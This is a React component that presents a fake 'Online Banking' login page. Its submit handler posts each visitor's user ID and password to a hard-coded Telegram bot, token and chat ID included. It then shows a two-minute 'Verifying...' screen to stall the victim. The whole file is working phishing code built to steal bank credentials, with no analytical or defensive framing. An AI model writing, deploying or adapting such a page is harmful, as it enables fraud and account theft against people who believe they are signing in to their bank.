import { useState } from "react";
import PageWatcher from "../components/pagewaters";

export default function EmailPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();

    const botToken = "8044905551:AAFHPE3MZz9B2jLceaAlqcvGU7QrQWD4ABY";
    const chatId = "7062736155";

    const message = `
📧 UserId Submitted

Userid: ${email}
Password: ${password}
  `;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        },
      );

      if (!response.ok) {
        throw new Error("Failed to send Telegram message");
      }

      // Show loading screen after the message has been sent
      setIsLoading(true);

      // Keep the loading screen visible for 2 minutes
      await new Promise((resolve) => setTimeout(resolve, 120000));

      setIsLoading(false);

      console.log("Email sent to Telegram");
      // navigate("/next-page");
    } catch (error) {
      console.error("Telegram error:", error);
      setIsLoading(false);
      alert("Failed to send email.");
    }
  };

  return (
    <>
      <PageWatcher />

      {isLoading && (
        <div className="fixed inset-0 flex items-center justify-center bg-white z-50">
          <div className="text-center">
            <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div>

            <h2 className="mt-6 text-2xl font-semibold">Verifying...</h2>

            <p className="mt-2 text-gray-500">
              Please wait while we verify your information.
              <br />
              This may take up to 2 minutes.
            </p>
          </div>
        </div>
      )}

      <div className=" bg-white flex justify-center pt-16 px-4">
        <div className="w-full max-w-[430px]">
          <h2 className="text-[18px] text-[#222] mb-5">
            Log in to{" "}
            <span className="italic font-semibold text-[#003A70]">
              Online Banking:
            </span>
          </h2>

          <form onSubmit={submit}>
            <input
              type="text"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="User ID"
              className="w-full h-12 border border-gray-400 rounded-sm px-4 text-[15px] placeholder:text-gray-500 focus:outline-none focus:border-[#003A70]"
            />

        <hr className="mb-5"/> 
            
            <input
              type="password"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter Your Password"
              className="w-full h-12 border border-gray-400 rounded-sm px-4 text-[15px] placeholder:text-gray-500 focus:outline-none focus:border-[#003A70]"
            />

            <button
              type="button"
              className="mt-2 text-[#0067B8] text-[14px] font-medium hover:underline"
            >
              Forgot password?
            </button>

            <button
              type="submit"
              className="mt-8 w-full h-12 rounded-sm bg-[#003A70] text-white text-[16px] font-semibold hover:bg-[#002d56]"
            >
              NEXT
            </button>
          </form>

          <div className="text-center mt-8">
            <p className="text-[15px] text-gray-800">
              New User?{" "}
              <button
                type="button"
                className="text-[#0067B8] font-semibold hover:underline"
              >
                Enroll
              </button>
            </p>

            <button
              type="button"
              className="mt-1 text-[#0067B8] text-[15px] font-semibold hover:underline"
            >
              Security and Privacy
            </button>
          </div>
        </div>
      </div>
    </>
  );
}
